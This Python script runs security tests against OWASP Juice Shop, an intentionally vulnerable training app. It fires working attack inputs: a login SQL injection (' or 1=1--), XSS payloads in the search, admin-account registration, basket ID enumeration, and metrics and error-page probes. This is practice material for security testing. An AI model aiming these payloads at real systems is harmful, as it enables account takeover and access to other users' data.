#!/usr/bin/env python3
"""
OWASP Juice Shop Security Testing Script
Specialized for testing https://juice-shop.herokuapp.com
"""

import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import argparse
import re
from colorama import Fore, Style

class JuiceShopTester:
    def __init__(self, base_url="https://juice-shop.herokuapp.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def print_status(self, message, status):
        """Print colored status messages"""
        colors = {
            "SUCCESS": Fore.GREEN,
            "INFO": Fore.CYAN,
            "WARNING": Fore.YELLOW,
            "VULNERABLE": Fore.RED,
            "ERROR": Fore.MAGENTA
        }
        print(f"{colors.get(status, Fore.WHITE)}[{status}]{Style.RESET_ALL} {message}")
    
    def test_admin_registration(self):
        """Test for insecure user registration (Juice Shop Challenge: Admin Registration)"""
        url = urljoin(self.base_url, "/api/Users/")
        payload = {
            "email": "admin@juice-sh.op",
            "password": "admin123",
            "passwordRepeat": "admin123",
            "securityQuestion": {
                "id": 2,
                "question": "Mother's maiden name?"
            },
            "securityAnswer": "Smith"
        }
        
        try:
            response = self.session.post(url, json=payload)
            if response.status_code == 201:
                self.vulnerabilities.append("Admin registration vulnerability: Able to register as admin@juice-sh.op")
                self.print_status("Admin registration vulnerability found!", "VULNERABLE")
                return True
        except Exception as e:
            self.print_status(f"Error testing admin registration: {str(e)}", "ERROR")
        
        self.print_status("Admin registration test passed (vulnerability not found)", "SUCCESS")
        return False

    def test_xss_in_search(self):
        """Test for XSS in search function (Juice Shop Challenge: XSS Tier 1)"""
        url = urljoin(self.base_url, "/rest/products/search")
        payloads = [
            "<script>alert('XSS1')</script>",
            "<img src=x onerror=alert('XSS2')>",
            "{{7*7}}"
        ]
        
        for payload in payloads:
            try:
                params = {"q": payload}
                response = self.session.get(url, params=params)
                
                if payload.lower() in response.text.lower():
                    self.vulnerabilities.append(f"XSS in search function with payload: {payload}")
                    self.print_status(f"XSS found in search function with payload: {payload}", "VULNERABLE")
                    return True
            except Exception as e:
                self.print_status(f"Error testing XSS in search: {str(e)}", "ERROR")
        
        self.print_status("No XSS found in search function", "SUCCESS")
        return False

    def test_sql_injection_login(self):
        """Test for SQL Injection in login (Juice Shop Challenge: Login Admin)"""
        url = urljoin(self.base_url, "/rest/user/login")
        payload = {
            "email": "' or 1=1--",
            "password": "anything"
        }
        
        try:
            response = self.session.post(url, json=payload)
            if "authentication" in response.json() and response.json()["authentication"]:
                self.vulnerabilities.append("SQL Injection in login: Successful login with ' or 1=1--")
                self.print_status("SQL Injection in login found!", "VULNERABLE")
                return True
        except Exception as e:
            self.print_status(f"Error testing SQLi in login: {str(e)}", "ERROR")
        
        self.print_status("No SQL Injection found in login", "SUCCESS")
        return False

    def test_exposed_metrics(self):
        """Test for exposed metrics endpoint (Juice Shop Challenge: Exposed Metrics)"""
        url = urljoin(self.base_url, "/metrics")
        
        try:
            response = self.session.get(url)
            if "process_start_time_seconds" in response.text:
                self.vulnerabilities.append("Exposed metrics endpoint found")
                self.print_status("Exposed metrics endpoint found!", "VULNERABLE")
                return True
        except Exception as e:
            self.print_status(f"Error testing metrics endpoint: {str(e)}", "ERROR")
        
        self.print_status("No exposed metrics endpoint found", "SUCCESS")
        return False

    def test_basket_manipulation(self):
        """Test for basket manipulation (Juice Shop Challenge: Basket Access)"""
        # First add an item to basket normally
        add_url = urljoin(self.base_url, "/api/BasketItems/")
        payload = {
            "ProductId": 1,
            "quantity": 1
        }
        
        try:
            # Add item to basket
            response = self.session.post(add_url, json=payload)
            basket_item_id = response.json().get("data", {}).get("id")
            
            if basket_item_id:
                # Test accessing other users' baskets
                test_url = urljoin(self.base_url, f"/api/BasketItems/{basket_item_id - 1}")
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    self.vulnerabilities.append("Basket manipulation vulnerability: Able to access other users' basket items")
                    self.print_status("Basket manipulation vulnerability found!", "VULNERABLE")
                    return True
        except Exception as e:
            self.print_status(f"Error testing basket manipulation: {str(e)}", "ERROR")
        
        self.print_status("No basket manipulation vulnerability found", "SUCCESS")
        return False

    def test_server_info_disclosure(self):
        """Test for server information disclosure (Juice Shop Challenge: Error Handling)"""
        url = urljoin(self.base_url, "/nonexistent-page")
        
        try:
            response = self.session.get(url)
            if "X-Powered-By" in response.headers:
                self.vulnerabilities.append(f"Server info disclosure: {response.headers['X-Powered-By']}")
                self.print_status("Server information disclosure found!", "VULNERABLE")
                return True
                
            if "stack" in response.text.lower():
                self.vulnerabilities.append("Error stack trace disclosure")
                self.print_status("Error stack trace disclosure found!", "VULNERABLE")
                return True
        except Exception as e:
            self.print_status(f"Error testing info disclosure: {str(e)}", "ERROR")
        
        self.print_status("No server information disclosure found", "SUCCESS")
        return False

    def run_all_tests(self):
        """Run all Juice Shop specific tests"""
        tests = [
            ("Admin Registration", self.test_admin_registration),
            ("XSS in Search", self.test_xss_in_search),
            ("SQL Injection in Login", self.test_sql_injection_login),
            ("Exposed Metrics", self.test_exposed_metrics),
            ("Basket Manipulation", self.test_basket_manipulation),
            ("Server Info Disclosure", self.test_server_info_disclosure)
        ]
        
        self.print_status(f"\nStarting OWASP Juice Shop Security Tests ({self.base_url})", "INFO")
        
        for name, test_func in tests:
            self.print_status(f"\n[+] Testing {name}...", "INFO")
            test_func()
        
        if self.vulnerabilities:
            self.print_status("\n=== Vulnerabilities Found ===", "VULNERABLE")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                self.print_status(f"{i}. {vuln}", "VULNERABLE")
        else:
            self.print_status("\nNo vulnerabilities found!", "SUCCESS")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OWASP Juice Shop Security Tester")
    parser.add_argument("--url", default="https://juice-shop.herokuapp.com", 
                       help="Juice Shop URL (default: https://juice-shop.herokuapp.com)")
    args = parser.parse_args()
    
    tester = JuiceShopTester(args.url)
    tester.run_all_tests()